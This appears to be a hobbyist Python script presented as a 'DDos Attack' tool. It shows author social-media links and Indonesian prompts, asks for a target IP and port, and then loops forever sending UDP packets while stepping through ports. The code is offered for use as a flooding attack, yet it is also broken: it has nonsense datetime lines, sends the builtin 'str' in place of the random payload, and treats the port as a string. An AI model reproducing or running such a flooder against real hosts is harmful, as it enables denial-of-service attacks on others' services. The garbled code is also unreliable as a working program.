import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
datetime = datetime(5)
minute = minute(int)
hour = hour(int)
day = day(int)
month = month(int)
year = year(int)

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1200)
##############

os.system("clear")
os.system("figlet DDos Attack")

print ("Author   : PheXcReY-Galaxy")
print ("You Tube : https://www.youtube.com/c/PheXcReY-Galaxy")
print ("github   : https://github.com/PheXcReY")
print ("Facebook : https://www.facebook.com/ArthurXzz")

ip = input("IP Target : ")
port = input("Port Target : ")
choice = input("Sudah Menyiapkan Virus?(y/n) : ")
Times = input("Masukan Jumlah Paket Virus : ")
Threads = input("Masukan Jumlah Kecepatan Virus : ")

os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(str, (ip,port))
     sent = sent + 1
     port = port + 1
     print(" ============== Mengirim Virus Corona Ke Target Dan Memberikan Permen Lolipop ============ ")
     sock.sendto(str, (ip,port))
     if port == 65534:
       port = 1
